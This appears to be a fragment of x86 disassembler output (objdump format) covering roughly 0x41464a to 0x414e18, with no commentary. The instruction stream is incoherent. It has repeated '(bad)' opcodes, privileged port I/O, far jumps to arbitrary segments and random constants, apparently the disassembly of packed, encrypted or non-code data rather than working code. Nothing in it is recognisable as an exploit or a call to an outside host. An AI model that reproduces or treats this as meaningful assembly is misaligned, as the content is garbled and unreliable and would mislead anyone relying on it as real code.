  41464a:	xchg   esi,eax
  41464b:	cmp    DWORD PTR [esp+eax*2],eax
  41464e:	ins    DWORD PTR es:[edi],dx
  41464f:	mov    ebx,0xf10a6831
  414654:	push   ss
  414655:	iret   
  414656:	push   edx
  414657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414658:	jae    0x41468a
  41465a:	test   DWORD PTR [ecx+0x39],esi
  41465d:	fcomp  QWORD PTR [ebx-0x52]
  414660:	addr16 test eax,0xb941e6a3
  414666:	fcom   QWORD PTR [edi+0xfc7fc7a]
  41466c:	loope  0x414691
  41466e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41466f:	or     DWORD PTR [edi+0x73f7c079],ebp
  414675:	and    ah,bh
  414677:	out    dx,al
  414678:	stos   BYTE PTR es:[edi],al
  414679:	push   ds
  41467a:	(bad)  
  41467b:	mov    al,ds:0x17aa3522
  414680:	jo     0x414689
  414682:	pop    ebx
  414683:	out    0x50,eax
  414685:	fldcw  WORD PTR [ebx]
  414687:	push   ebx
  414688:	jg     0x414622
  41468a:	ret    
  41468b:	fsubp  st(2),st
  41468d:	jecxz  0x4146a4
  41468f:	gs out dx,al
  414691:	xchg   esp,eax
  414692:	out    0x6,al
  414694:	lea    eax,[ebx+0x180d02c1]
  41469a:	(bad)  
  41469b:	sub    eax,DWORD PTR [edi+ebx*8+0x55934c3b]
  4146a2:	mov    esi,DWORD PTR [esi+ebx*1-0x300025dd]
  4146a9:	adc    eax,0x9b51c689
  4146ae:	jecxz  0x4146cc
  4146b0:	xor    al,0xea
  4146b2:	fidivr DWORD PTR [edx+0x67]
  4146b5:	in     eax,0x96
  4146b7:	xchg   WORD PTR [edx],bx
  4146ba:	in     eax,0x71
  4146bc:	retf   0x5360
  4146bf:	jbe    0x414718
  4146c1:	xchg   DWORD PTR [eax],ebx
  4146c3:	jno    0x4146b5
  4146c5:	mov    ch,0x70
  4146c7:	sbb    ah,BYTE PTR [ecx+ecx*2-0x66b504b0]
  4146ce:	stos   DWORD PTR es:[edi],eax
  4146cf:	ret    
  4146d0:	pop    es
  4146d1:	imul   ebp,DWORD PTR [edi-0x7],0x26ed8cbc
  4146d8:	or     esp,DWORD PTR [ecx]
  4146da:	iret   
  4146db:	fldcw  WORD PTR [edx+0x20]
  4146de:	outs   dx,DWORD PTR ds:[esi]
  4146df:	pop    es
  4146e0:	push   0xca20822e
  4146e5:	jnp    0x41470f
  4146e7:	and    BYTE PTR [ebx],bh
  4146e9:	dec    ebx
  4146ea:	dec    esi
  4146eb:	mov    BYTE PTR [esi],cl
  4146ed:	adc    dh,BYTE PTR [edi-0x74]
  4146f0:	cmp    eax,0xa1e7274e
  4146f5:	dec    edx
  4146f6:	daa    
  4146f7:	push   edi
  4146f8:	rcr    edx,cl
  4146fa:	sub    eax,0x1ae2a3b5
  4146ff:	cmp    eax,0x9720e49
  414704:	icebp  
  414705:	push   ebx
  414706:	lock ja 0x414717
  414709:	stos   DWORD PTR es:[edi],eax
  41470a:	and    al,0x99
  41470c:	mov    bh,0x3a
  41470e:	jae    0x4146e1
  414710:	in     eax,dx
  414711:	xchg   BYTE PTR [ebx],bh
  414713:	outs   dx,DWORD PTR ds:[esi]
  414714:	sub    edx,DWORD PTR [esi-0x62]
  414717:	jo     0x41475c
  414719:	mov    ebp,0x32c06f4f
  41471e:	sub    esp,ebp
  414720:	pop    ebp
  414721:	fld    TBYTE PTR [ebp+0x4b]
  414724:	sbb    cl,BYTE PTR [edi-0x50ff06b0]
  41472a:	jbe    0x4146c8
  41472c:	or     DWORD PTR [esi+0xcfb1bec],edx
  414732:	ret    
  414733:	dec    eax
  414734:	adc    BYTE PTR [eax],al
  414736:	cmc    
  414737:	shl    BYTE PTR [ecx+0x61],1
  41473a:	mov    ds:0xbab3ed11,al
  41473f:	cmp    ch,BYTE PTR [esi]
  414741:	sbb    eax,0x3f373892
  414746:	jmp    0xd7f8:0x84d2946f
  41474d:	lock jae 0x414737
  414750:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414751:	sub    ebp,ebx
  414753:	inc    ebx
  414754:	mov    ebp,fs
  414756:	push   ebx
  414757:	adc    BYTE PTR [ebx+0x52],cl
  41475a:	popa   
  41475b:	iret   
  41475c:	jmp    edi
  41475e:	test   eax,0xa4265b2b
  414763:	or     BYTE PTR [eax-0x8],dh
  414766:	in     al,dx
  414767:	test   eax,0xe1996f49
  41476c:	add    BYTE PTR [ecx],cl
  41476e:	mov    al,0xec
  414770:	lods   eax,DWORD PTR ds:[esi]
  414771:	sar    BYTE PTR [ebp+0x22],0xab
  414775:	ret    
  414776:	mov    BYTE PTR [edi-0x22b12ccf],bh
  41477c:	jo     0x4147d0
  41477e:	mov    eax,ds:0x6a5007bb
  414783:	mov    edx,0x8f28d197
  414788:	mov    ?,WORD PTR [eax-0x1bbb781d]
  41478e:	(bad)  
  41478f:	lahf   
  414790:	retf   0x62fe
  414793:	push   edi
  414794:	inc    ebx
  414795:	out    0xfe,eax
  414797:	retf   
  414798:	mov    esi,0xa5ac652b
  41479d:	in     al,0xa0
  41479f:	add    eax,0xeb938747
  4147a4:	ds test al,0x3d
  4147a7:	push   eax
  4147a8:	div    DWORD PTR [ecx]
  4147aa:	jnp    0x41477a
  4147ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147ad:	push   eax
  4147ae:	pop    es
  4147af:	xchg   ebx,eax
  4147b0:	jp     0x4147ed
  4147b2:	push   esp
  4147b3:	sbb    al,BYTE PTR [edi+0x703e7930]
  4147b9:	push   edx
  4147ba:	mov    bh,bh
  4147bc:	imul   esp,DWORD PTR [edx-0x57],0xfffffffd
  4147c0:	cmp    BYTE PTR [eax+0x6a5a8471],bl
  4147c6:	stos   DWORD PTR es:[edi],eax
  4147c7:	test   BYTE PTR [edx],bl
  4147c9:	addr16 push ss
  4147cb:	add    al,0x9d
  4147cd:	push   eax
  4147ce:	cmp    DWORD PTR [ebp+0xd],0xffffffc2
  4147d2:	cs cmp ch,cl
  4147d5:	mov    ebx,0xf1d16755
  4147da:	jp     0x4147af
  4147dc:	inc    edi
  4147dd:	inc    edi
  4147de:	stos   DWORD PTR es:[edi],eax
  4147df:	loopne 0x41485f
  4147e1:	mov    ebx,0xe4d0c9c1
  4147e6:	push   es
  4147e7:	dec    ecx
  4147e8:	pop    eax
  4147e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147ea:	inc    eax
  4147eb:	push   esp
  4147ec:	sub    al,0x71
  4147ee:	cld    
  4147ef:	cwde   
  4147f0:	cmp    eax,0x90e4ca6e
  4147f5:	push   ebx
  4147f6:	sahf   
  4147f7:	jecxz  0x4147d3
  4147f9:	test   BYTE PTR [ecx-0x41],al
  4147fc:	push   esp
  4147fd:	ds iret 
  4147ff:	xchg   esp,eax
  414800:	fdivrp st(7),st
  414802:	dec    edx
  414803:	test   DWORD PTR [ebp+0x2e0d1523],edx
  414809:	add    eax,0xdf90aa39
  41480e:	sbb    ebp,DWORD PTR [edx-0x114e1652]
  414814:	inc    ebx
  414815:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414816:	retf   0x3a01
  414819:	hlt    
  41481a:	retf   
  41481b:	dec    ecx
  41481c:	push   es
  41481d:	jbe    0x41483a
  41481f:	add    bl,BYTE PTR [edx-0x4396e701]
  414825:	xor    DWORD PTR [ecx+0x56d16b5a],ebx
  41482b:	push   eax
  41482c:	mov    ecx,0x260449ac
  414831:	test   al,0x6a
  414833:	cmp    DWORD PTR [ebx+0x9],edi
  414836:	in     al,dx
  414837:	push   esp
  414838:	xlat   BYTE PTR ds:[ebx]
  414839:	rol    DWORD PTR [ecx+eax*4+0xf],cl
  41483d:	xchg   ebp,eax
  41483e:	sbb    eax,0x37ca0c3d
  414843:	mov    ebp,0x2d5df861
  414848:	dec    ecx
  414849:	lahf   
  41484a:	pop    edx
  41484b:	outs   dx,DWORD PTR ds:[esi]
  41484c:	repnz pop edi
  41484e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41484f:	pop    ebx
  414850:	cmc    
  414851:	dec    ecx
  414852:	fnstenv ds:0xa629a21
  414858:	into   
  414859:	mov    ecx,0x6eff1757
  41485e:	jmp    0x4148c9
  414860:	clc    
  414861:	retf   
  414862:	ret    0x229c
  414865:	or     al,al
  414867:	cmp    ch,BYTE PTR [ecx]
  414869:	and    eax,0xe3e0f5e3
  41486e:	pop    es
  41486f:	lea    edi,[edx-0x4f]
  414872:	fscale 
  414874:	dec    ebp
  414875:	lahf   
  414876:	dec    esp
  414877:	sub    BYTE PTR [ebx],bl
  414879:	aad    0x97
  41487b:	mov    ds:0x4bd5b984,al
  414880:	mov    WORD PTR [ebx],gs
  414882:	fisttp DWORD PTR [ebp+0xa]
  414885:	or     dl,BYTE PTR [edx+0x8a54d04]
  41488b:	retf   0x2bf4
  41488e:	mov    ch,0x3d
  414890:	inc    edi
  414891:	push   ss
  414892:	sub    eax,DWORD PTR ds:0xf4a955fc
  414898:	mov    al,0x72
  41489a:	test   BYTE PTR [ecx-0x45f74c3e],cl
  4148a0:	cmp    dh,BYTE PTR [ecx+0xa]
  4148a3:	sbb    bh,BYTE PTR [edx+0x17357746]
  4148a9:	push   0xe228f1eb
  4148ae:	sbb    eax,0xcd0e946f
  4148b3:	cwde   
  4148b4:	scas   eax,DWORD PTR es:[edi]
  4148b5:	arpl   WORD PTR [eax+0x15],dx
  4148b8:	or     ch,BYTE PTR [ebx+0x7f9d8a26]
  4148be:	fsub   QWORD PTR [esi+0x48]
  4148c1:	inc    esp
  4148c2:	jecxz  0x414871
  4148c4:	sbb    BYTE PTR [ebp-0x34ce4d45],ah
  4148ca:	xchg   esp,eax
  4148cb:	inc    edi
  4148cc:	pop    esi
  4148cd:	push   ebp
  4148ce:	push   ds
  4148cf:	je     0x4148fe
  4148d1:	out    dx,eax
  4148d2:	outs   dx,BYTE PTR ds:[esi]
  4148d3:	push   es
  4148d4:	mov    ecx,0x3d06b3e7
  4148d9:	repz mov ebp,0x6fbad32b
  4148df:	scas   al,BYTE PTR es:[edi]
  4148e0:	jns    0x4148af
  4148e2:	cmp    DWORD PTR [ebx-0x42],ebp
  4148e5:	inc    esi
  4148e6:	test   al,0x77
  4148e8:	in     eax,dx
  4148e9:	lds    edi,FWORD PTR [eax+0x176cb07c]
  4148ef:	jl     0x414955
  4148f1:	retf   0xd043
  4148f4:	aaa    
  4148f5:	push   eax
  4148f6:	inc    edi
  4148f7:	idiv   BYTE PTR [ebp+ebx*4+0x7c13cc50]
  4148fe:	js     0x414951
  414900:	and    ah,BYTE PTR ds:0xbba6f81d
  414906:	mov    DWORD PTR [ebp+ebx*4-0x61],edx
  41490a:	mov    ah,0x92
  41490c:	lods   al,BYTE PTR ds:[esi]
  41490d:	fisttp WORD PTR [eax-0x76]
  414910:	call   0xc0e8:0xe6afd44a
  414917:	in     eax,dx
  414918:	clc    
  414919:	leave  
  41491a:	rcr    DWORD PTR [edi-0x1b],0xd4
  41491e:	jo     0x414945
  414920:	(bad)  
  414921:	in     al,0xf8
  414923:	cld    
  414924:	push   eax
  414925:	mov    DWORD PTR [ebx+0x7e],esp
  414928:	(bad)  [esi]
  41492a:	imul   ecx,DWORD PTR [ebx+0x300c1255],0xffffffee
  414931:	ds es dec ebp
  414934:	xor    ah,BYTE PTR [ecx-0x63]
  414937:	iret   
  414938:	(bad)  
  414939:	xor    ch,dl
  41493b:	pop    edi
  41493c:	push   0x4
  41493e:	retf   0xe052
  414941:	and    dl,BYTE PTR [ebx-0x129e1460]
  414947:	pop    ebx
  414948:	loop   0x41496c
  41494a:	sar    edi,cl
  41494c:	cmc    
  41494d:	imul   edi,eax,0x4e01dc68
  414953:	push   0xffffffcd
  414955:	cmp    DWORD PTR [edi+ebp*1+0x66],0x1dbecb9b
  41495d:	sbb    eax,0x230f6c44
  414962:	les    eax,FWORD PTR [esi]
  414964:	dec    edi
  414965:	jmp    0xc125:0x5497b2a7
  41496c:	out    0xba,eax
  41496e:	sahf   
  41496f:	mov    ds:0xcda3ae3,eax
  414974:	pushf  
  414975:	(bad)  
  414976:	mov    es,edi
  414978:	je     0x41491a
  41497a:	mov    cl,0x4e
  41497c:	loop   0x41496d
  41497e:	sub    BYTE PTR [ecx-0x33],cl
  414981:	add    dh,BYTE PTR [eax+0x63]
  414984:	and    ch,dl
  414986:	adc    al,0xf8
  414988:	cmc    
  414989:	icebp  
  41498a:	sub    esi,DWORD PTR [edi+edx*1]
  41498d:	sub    BYTE PTR [ecx+0x2ef2bb55],ch
  414993:	mov    ch,0x9
  414995:	jg     0x414a00
  414997:	fiadd  DWORD PTR [edi+eax*8+0x43033004]
  41499e:	cmp    dl,al
  4149a0:	icebp  
  4149a1:	xchg   ebx,eax
  4149a2:	mov    dl,0x74
  4149a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149a5:	enter  0xac3c,0x28
  4149a9:	in     al,dx
  4149aa:	xor    al,BYTE PTR [esi]
  4149ac:	and    edx,DWORD PTR [esi]
  4149ae:	ins    DWORD PTR es:[edi],dx
  4149af:	adc    DWORD PTR [ecx+0x38],edi
  4149b2:	fs mov eax,0x524ad1a8
  4149b8:	bswap  eax
  4149ba:	mov    dl,0xf0
  4149bc:	lods   eax,DWORD PTR ds:[esi]
  4149bd:	sub    ah,ah
  4149bf:	inc    ebx
  4149c0:	dec    eax
  4149c1:	into   
  4149c2:	dec    ebx
  4149c3:	xor    BYTE PTR [ecx+ecx*1-0x5e1d5c91],0xa2
  4149cb:	imul   esi,DWORD PTR [edi],0x467122f
  4149d1:	outs   dx,BYTE PTR ds:[esi]
  4149d2:	jae    0x414a4b
  4149d4:	xchg   ecx,eax
  4149d5:	xor    ch,0xfa
  4149d8:	mov    bh,0x8c
  4149da:	xor    ch,BYTE PTR [eax+eiz*4+0x28]
  4149de:	cmp    bl,BYTE PTR [edx+0xf8b2fdd]
  4149e4:	mov    ah,dh
  4149e6:	fsubr  DWORD PTR [ecx]
  4149e8:	sub    ecx,DWORD PTR [ecx]
  4149ea:	out    0x85,eax
  4149ec:	adc    al,0xb4
  4149ee:	fidiv  DWORD PTR [edx-0x40]
  4149f1:	test   BYTE PTR [eax+0x19],0x99
  4149f5:	fistp  WORD PTR [ecx-0x32663941]
  4149fb:	xor    ebp,DWORD PTR [ebx]
  4149fd:	ror    BYTE PTR [eax-0x37767720],1
  414a03:	js     0x414a71
  414a05:	call   0xf8fc:0x10cf681b
  414a0c:	sub    BYTE PTR [edi],ch
  414a0e:	das    
  414a0f:	cld    
  414a10:	or     BYTE PTR [ebx-0x5b619398],0xf9
  414a17:	adc    edx,DWORD PTR [esi+0x1fc0af0c]
  414a1d:	(bad)  
  414a1e:	(bad)  
  414a1f:	out    0x9,al
  414a21:	(bad)  
  414a22:	aad    0xcc
  414a24:	shl    DWORD PTR [esi+0x4f8cc416],cl
  414a2a:	cmp    DWORD PTR [ebp-0x6fb38c4e],esi
  414a30:	add    BYTE PTR [ecx-0x319bcd30],al
  414a36:	push   cs
  414a37:	shl    bh,1
  414a39:	daa    
  414a3a:	fisubr WORD PTR [ebp+0x3646783a]
  414a40:	out    dx,eax
  414a41:	mov    eax,0xe6df5332
  414a46:	int3   
  414a47:	dec    ebx
  414a48:	icebp  
  414a49:	dec    esi
  414a4a:	pop    ebp
  414a4b:	js     0x4149df
  414a4d:	call   0x7448cb0f
  414a52:	cmc    
  414a53:	jecxz  0x414a6f
  414a55:	mov    edx,0xc0b9cb91
  414a5a:	jle    0x414a2a
  414a5c:	and    BYTE PTR [edi-0x49e86204],bh
  414a62:	or     edi,DWORD PTR [eax+ebp*4-0x9]
  414a66:	sub    dl,BYTE PTR [ebp+0x39cc1954]
  414a6c:	aam    0x1a
  414a6e:	cwde   
  414a6f:	dec    esp
  414a70:	add    BYTE PTR [esi+0x52],bh
  414a73:	jb     0x414a7b
  414a75:	sti    
  414a76:	(bad)  
  414a78:	sbb    ebp,DWORD PTR [edi-0x6ef2fd2]
  414a7e:	inc    ebx
  414a7f:	fld    TBYTE PTR [edi-0x48]
  414a82:	adc    ah,BYTE PTR [eax+edx*1]
  414a85:	(bad)  
  414a87:	dec    esi
  414a88:	cmp    BYTE PTR [ecx-0x65babcf7],ch
  414a8e:	dec    esp
  414a8f:	mov    dl,0x7d
  414a91:	sbb    DWORD PTR [eax+0x5dfefe5a],0xa9bf5408
  414a9b:	inc    ebp
  414a9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a9d:	aaa    
  414a9e:	clc    
  414a9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414aa0:	xchg   esp,eax
  414aa1:	inc    edi
  414aa2:	and    BYTE PTR es:[edx+0xf],bh
  414aa6:	mov    ch,0x29
  414aa8:	push   0x15e20ee1
  414aad:	push   ss
  414aae:	fimul  WORD PTR [esi-0x15]
  414ab1:	xchg   edx,eax
  414ab2:	ret    0x9950
  414ab5:	paddq  mm4,QWORD PTR [edx-0x72]
  414ab9:	push   ds
  414aba:	in     al,dx
  414abb:	dec    ebp
  414abc:	adc    BYTE PTR [edi],ah
  414abe:	mov    ds:0xbc97158b,eax
  414ac3:	in     al,dx
  414ac4:	test   DWORD PTR ss:[eax+0x589347be],esp
  414acb:	xor    dl,dh
  414acd:	adc    DWORD PTR [ebp+0x44],0xaf735cbb
  414ad4:	or     eax,0x75b9fc1d
  414ad9:	or     ebp,DWORD PTR [ecx+0x5a]
  414adc:	or     bh,al
  414ade:	or     al,0x56
  414ae0:	or     esp,DWORD PTR [edi]
  414ae2:	ds dec edi
  414ae4:	mov    bl,0x16
  414ae6:	loopne 0x414af9
  414ae8:	jge    0x414ad1
  414aea:	retf   0x714f
  414aed:	cmp    BYTE PTR [ecx-0x43],0x5f
  414af1:	xchg   dl,bh
  414af3:	dec    eax
  414af4:	ror    DWORD PTR [edx+0x777e934e],0xf2
  414afb:	pop    ebx
  414afc:	mov    ds,WORD PTR [ecx]
  414afe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414aff:	push   ecx
  414b00:	add    ecx,DWORD PTR [edx+0x4f18e9d0]
  414b06:	nop
  414b07:	enter  0xd748,0x21
  414b0b:	dec    ebx
  414b0c:	xchg   esi,eax
  414b0d:	inc    esp
  414b0e:	pusha  
  414b0f:	inc    ecx
  414b10:	clc    
  414b11:	sub    BYTE PTR [ebx-0x2e],al
  414b14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b15:	xchg   ebp,eax
  414b16:	les    ebp,FWORD PTR [eax+0x40]
  414b19:	in     al,dx
  414b1a:	mov    edi,0xd6ccc46c
  414b1f:	dec    esp
  414b20:	jle    0x414b9e
  414b22:	shr    esp,0xcb
  414b25:	push   es
  414b26:	mov    edx,?
  414b28:	aas    
  414b29:	popf   
  414b2a:	outs   dx,DWORD PTR ds:[esi]
  414b2b:	dec    esi
  414b2c:	repz add DWORD PTR [ecx+0x78c4ec98],0x2b90f2c0
  414b37:	mov    WORD PTR [ecx+0x2ce9fc95],es
  414b3d:	loopne 0x414b2a
  414b3f:	mov    ds:0x61f06dd5,al
  414b44:	jmp    0x414b30
  414b46:	sbb    eax,0x547e0c34
  414b4b:	int    0x5
  414b4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b4e:	adc    eax,0x9406da69
  414b53:	pop    edi
  414b54:	rol    BYTE PTR [ecx+0x10],1
  414b57:	repz mov ds:0xb3d6ab18,al
  414b5d:	cmp    DWORD PTR [edi-0x51],eax
  414b60:	loope  0x414baf
  414b62:	xor    DWORD PTR [edi-0x7df89e42],eax
  414b68:	mov    esi,0x9702d8b5
  414b6d:	adc    BYTE PTR [esi+0x11],ah
  414b70:	sbb    BYTE PTR [esi-0x4a],al
  414b73:	stc    
  414b74:	add    esi,esp
  414b76:	fimul  DWORD PTR [edi-0x6c1e1cea]
  414b7c:	jecxz  0x414b51
  414b7e:	call   0x82749f2b
  414b83:	ret    
  414b84:	out    0x13,eax
  414b86:	neg    ecx
  414b88:	jle    0x414b58
  414b8a:	pop    es
  414b8b:	mov    ecx,0x431d9c10
  414b90:	inc    ebx
  414b91:	loopne 0x414c04
  414b93:	xchg   edi,eax
  414b94:	jecxz  0x414b95
  414b96:	sahf   
  414b97:	daa    
  414b98:	enter  0x269a,0x65
  414b9c:	push   esp
  414b9d:	cdq    
  414b9e:	jmp    0x3fa6:0x213628e4
  414ba5:	ins    DWORD PTR es:[edi],dx
  414ba6:	je     0x414bd6
  414ba8:	xchg   ebx,eax
  414ba9:	adc    edx,DWORD PTR [edx-0x35]
  414bac:	mov    ebp,0x827e5705
  414bb1:	ret    0x9393
  414bb4:	shl    DWORD PTR [edx-0x5731566],cl
  414bba:	or     esp,DWORD PTR [esi-0xf]
  414bbd:	adc    al,0x92
  414bbf:	mov    dh,0x7
  414bc1:	imul   ecx,ebp,0xffffffeb
  414bc4:	out    dx,eax
  414bc5:	add    edx,0x39
  414bc8:	mov    ebp,0x36ac05bd
  414bcd:	nop
  414bce:	retf   0xd14e
  414bd1:	hlt    
  414bd2:	cld    
  414bd3:	cli    
  414bd4:	pushf  
  414bd5:	cmp    BYTE PTR [esi],bh
  414bd7:	push   ecx
  414bd8:	inc    eax
  414bd9:	jge    0x414b76
  414bdb:	mov    bh,0x13
  414bdd:	ja     0x414beb
  414bdf:	cwde   
  414be0:	push   edx
  414be1:	xchg   esp,eax
  414be2:	dec    dl
  414be4:	add    DWORD PTR [ecx],ebx
  414be6:	mov    eax,ds:0xfd3c2ef1
  414beb:	jbe    0x414bd8
  414bed:	popf   
  414bee:	pop    eax
  414bef:	cmp    al,0x4d
  414bf1:	imul   edi,DWORD PTR [ebp-0x4d38abcc],0xffffffe5
  414bf8:	jbe    0x414c1d
  414bfa:	adc    eax,0x9c0b0e8a
  414bff:	sub    al,0x33
  414c01:	ss cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c04:	sbb    eax,DWORD PTR [ecx+0x30964522]
  414c0a:	adc    BYTE PTR [ebx-0x38],0x91
  414c0e:	and    bh,dl
  414c10:	sbb    BYTE PTR [edx-0x316d0de9],ah
  414c16:	out    0x6f,eax
  414c18:	mov    bh,0x93
  414c1a:	mov    ds,WORD PTR [edx+0xe8b4ef2]
  414c20:	lods   eax,DWORD PTR ds:[esi]
  414c21:	mov    edi,DWORD PTR [edx-0x73638a9f]
  414c27:	push   edx
  414c28:	arpl   sp,di
  414c2a:	xchg   ecx,eax
  414c2b:	icebp  
  414c2c:	leave  
  414c2d:	inc    esp
  414c2e:	cmp    DWORD PTR [edx*4+0x5781a6c6],edi
  414c35:	ins    BYTE PTR es:[edi],dx
  414c36:	arpl   WORD PTR [eax-0x41a8b850],ax
  414c3c:	push   edx
  414c3d:	lds    ecx,FWORD PTR [ecx-0x3ca2d4cb]
  414c43:	or     esi,DWORD PTR [eax-0x1c6dad6]
  414c49:	dec    eax
  414c4a:	aaa    
  414c4b:	jmp    0x414bda
  414c4d:	daa    
  414c4e:	lds    ebx,FWORD PTR [esi-0x58883c1f]
  414c54:	rcl    ebx,cl
  414c56:	push   ds
  414c57:	in     al,0x77
  414c59:	ins    BYTE PTR es:[di],dx
  414c5b:	stc    
  414c5c:	psrlq  mm1,QWORD PTR [edi-0x4247f1a0]
  414c63:	stos   BYTE PTR es:[edi],al
  414c64:	inc    eax
  414c65:	div    DWORD PTR [edx]
  414c67:	aam    0xf3
  414c69:	ins    BYTE PTR es:[edi],dx
  414c6a:	std    
  414c6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c6c:	cli    
  414c6d:	adc    eax,0xbcc2ad6b
  414c72:	xchg   esp,eax
  414c73:	fdivr  st,st(2)
  414c75:	aad    0xbf
  414c77:	retf   0xd6fb
  414c7a:	or     BYTE PTR [edx],al
  414c7c:	in     al,0x92
  414c7e:	fidiv  DWORD PTR [eax]
  414c80:	adc    al,0x3f
  414c82:	xchg   esp,eax
  414c83:	mov    ds:0x9fdafe52,eax
  414c88:	(bad)  
  414c8a:	push   ds
  414c8b:	inc    edx
  414c8c:	call   0xdf326df4
  414c91:	mov    esi,0xc5934923
  414c96:	push   ebp
  414c97:	jl     0x414cb2
  414c99:	dec    edx
  414c9a:	mov    edi,0xcde9feef
  414c9f:	test   al,0xd2
  414ca1:	js     0x414cbb
  414ca3:	sar    BYTE PTR ds:0xae2edf8f,0xdb
  414caa:	pop    edi
  414cab:	sbb    al,0xd5
  414cad:	rcl    BYTE PTR [ecx+ecx*2+0x34],cl
  414cb1:	add    eax,0xadb96c9
  414cb6:	and    ebp,DWORD PTR [eax-0x3032e83a]
  414cbc:	sahf   
  414cbd:	or     eax,0x633f8d2a
  414cc2:	push   esi
  414cc3:	scas   eax,DWORD PTR es:[edi]
  414cc4:	xchg   esp,eax
  414cc5:	ficomp WORD PTR [ebx]
  414cc7:	and    al,0x13
  414cc9:	pushf  
  414cca:	mov    ch,0x9a
  414ccc:	inc    esp
  414ccd:	push   ecx
  414cce:	or     eax,0xa6221cb4
  414cd3:	add    DWORD PTR [ebp+0xeac4906],eax
  414cd9:	adc    eax,0xa0fbc1bf
  414cde:	mov    edx,0xfda2a2a
  414ce3:	inc    ebp
  414ce4:	cwde   
  414ce5:	mov    dh,BYTE PTR [ebx+eiz*1-0x18f4f895]
  414cec:	jae    0x414c8b
  414cee:	mov    eax,ds:0x898cb00f
  414cf3:	je     0x414caa
  414cf5:	inc    ecx
  414cf6:	adc    BYTE PTR [ebx+0xf7ef798],dh
  414cfc:	inc    esi
  414cfd:	cmp    DWORD PTR [ebx],ebp
  414cff:	repnz xlat BYTE PTR ds:[ebx]
  414d01:	cmp    al,0x3
  414d03:	dec    DWORD PTR [edi+0x733f8e34]
  414d09:	pop    ebx
  414d0a:	pop    ds
  414d0b:	mov    edx,0x7c70793c
  414d10:	sbb    edx,DWORD PTR [ebx+ecx*4-0x340a6553]
  414d17:	pop    esp
  414d18:	cmp    al,0x25
  414d1a:	xor    eax,0xebd8d25
  414d1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d20:	fwait
  414d21:	pop    esp
  414d22:	and    DWORD PTR [edi+0x19],esi
  414d25:	retf   
  414d26:	mov    edx,ss
  414d28:	(bad)  
  414d2a:	inc    esp
  414d2b:	jns    0x414d5b
  414d2d:	or     BYTE PTR [esi+ebp*2-0x3f9cc1fd],0x68
  414d35:	in     eax,0x99
  414d37:	jmp    0x13b2:0x7da2fd00
  414d3e:	xor    bl,ch
  414d40:	fldenv [edi]
  414d42:	ins    DWORD PTR es:[edi],dx
  414d43:	xchg   ecx,eax
  414d44:	scas   al,BYTE PTR es:[edi]
  414d45:	and    bh,dl
  414d47:	int3   
  414d48:	lea    eax,[esi]
  414d4a:	ss call 0x330f:0x7fc73191
  414d52:	aaa    
  414d53:	inc    edx
  414d54:	jo     0x414dbb
  414d56:	out    dx,al
  414d57:	retf   0x54b2
  414d5a:	mov    eax,ds:0xd0e39b1c
  414d5f:	(bad)  
  414d60:	jo     0x414d87
  414d62:	scas   al,BYTE PTR es:[edi]
  414d63:	push   esp
  414d64:	jmp    0x3a93d364
  414d69:	adc    ecx,DWORD PTR [ecx-0x24830c29]
  414d6f:	xlat   BYTE PTR ds:[ebx]
  414d70:	adc    eax,0xccb26de7
  414d75:	mov    eax,ds:0xe476372b
  414d7a:	je     0x414d5c
  414d7c:	cld    
  414d7d:	inc    ecx
  414d7e:	sbb    edi,DWORD PTR [edx]
  414d80:	add    eax,0xddab54fb
  414d85:	mov    ss,WORD PTR [edx+esi*4]
  414d88:	daa    
  414d89:	imul   BYTE PTR ds:[edi]
  414d8c:	and    bl,BYTE PTR [esi-0x50]
  414d8f:	hlt    
  414d90:	cmp    eax,0xf4b7567e
  414d95:	loopne 0x414d1d
  414d97:	sti    
  414d98:	rcr    dh,0x70
  414d9b:	jne    0x414e02
  414d9d:	lds    edx,FWORD PTR [edx-0xa2b9245]
  414da3:	shl    ecx,0xbe
  414da6:	mov    ebp,0x5179d762
  414dab:	cs ja  0x414db8
  414dae:	pop    eax
  414daf:	sbb    BYTE PTR [ebx],0xa
  414db2:	mov    ecx,0x32280bb5
  414db7:	dec    edi
  414db8:	jns    0x414e03
  414dba:	sahf   
  414dbb:	xor    DWORD PTR [ebx],0xed80a075
  414dc1:	inc    ebp
  414dc2:	ins    DWORD PTR es:[edi],dx
  414dc3:	push   ebp
  414dc4:	jb     0x414e09
  414dc6:	stos   BYTE PTR es:[edi],al
  414dc7:	repz or DWORD PTR [edx+eax*1+0x54],edx
  414dcc:	adc    BYTE PTR [ecx-0x1bc9ad19],cl
  414dd2:	pop    ebp
  414dd3:	hlt    
  414dd4:	dec    edi
  414dd5:	dec    edx
  414dd6:	mov    esp,DWORD PTR [ecx+ebx*1-0x6f]
  414dda:	mov    edx,?
  414ddc:	sbb    al,0xce
  414dde:	es daa 
  414de0:	mov    edx,0x53d2d08e
  414de5:	sub    eax,0xe209b1b9
  414dea:	jne    0x414dfc
  414dec:	ja     0x414e45
  414dee:	(bad)  
  414df0:	in     eax,0xc5
  414df2:	xchg   edi,eax
  414df3:	push   0xffffffe0
  414df5:	and    BYTE PTR [edx+0x7f23e595],ah
  414dfb:	push   ebx
  414dfc:	pop    ebx
  414dfd:	push   es
  414dfe:	adc    eax,0x36940e15
  414e03:	retf   
  414e04:	out    dx,al
  414e05:	inc    ecx
  414e06:	jp     0x847e5c0d
  414e0c:	sub    DWORD PTR [eax+0x7d],ebp
  414e0f:	push   0x45ffadee
  414e14:	loope  0x414e62
  414e16:	pusha  
  414e17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e18:	ja     0x414de5
